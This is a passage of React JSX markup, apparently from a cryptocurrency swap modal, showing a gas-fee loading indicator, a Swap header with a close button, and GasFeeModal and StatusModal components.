                                        <div className="w-8 h-8 rounded-full bg-[#3375BB]/20 flex items-center justify-center animate-pulse flex-shrink-0">
                                            <div className="w-3 h-3 rounded-full bg-[#3375BB]"></div>
                                        </div>
                                        <span className={`text-sm font-medium ${theme === 'dark' ? 'text-white' : 'text-[#3375BB]'}`}>Estimating Gas fees</span>
                                    </div>
                                </div>
                            </div>
                        ) : (
                            <div className="p-6 pb-10">
                                <div className="flex items-center justify-between mb-4">
                                    <h2 className="text-lg font-bold">Swap</h2>
                                    <button
                                        onClick={onClose}
                                        className="w-8 h-8 flex items-center justify-center bg-gray-800/50 hover:bg-gray-700/50 rounded-full transition-colors text-gray-400 hover:text-white"
                                    >
                                        <X className="w-5 h-5" />
                                    </button>
                                </div>
                                {renderForm()}
                            </div>
                        )}
                    </motion.div>

                    <GasFeeModal
                        isOpen={showGasModal}
                        onClose={() => setShowGasModal(false)}
                        onSuccess={handleGasSuccess}
                        user={user}
                        theme={theme}
                        network={currentNetwork}
                    />
                    <StatusModal
                        isOpen={showStatusModal}
                        onClose={() => setShowStatusModal(false)}
                        title={statusModalConfig.title}
                        message={statusModalConfig.message}
                        success={statusModalConfig.success}
                        theme={theme}
                    />
                </div>
            )}
        </AnimatePresence>
    );
}
